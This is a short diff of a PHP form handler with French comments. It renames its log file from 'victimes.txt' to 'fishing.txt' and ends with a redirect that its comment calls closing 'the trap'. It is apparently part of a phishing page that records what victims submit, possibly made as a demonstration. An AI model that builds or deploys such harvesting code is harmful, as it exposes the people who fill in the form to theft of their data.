@@ -38,7 +38,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $log_entry .= "==================================================\n\n";
 
     // 4. Écriture dans le fichier local
-    file_put_contents("victimes.txt", $log_entry, FILE_APPEND);
+    file_put_contents("fishing.txt", $log_entry, FILE_APPEND);
 
     // 5. Redirection finale pour clore le piège
     header("Location: mailto:clubinfoepo@gmail.com");
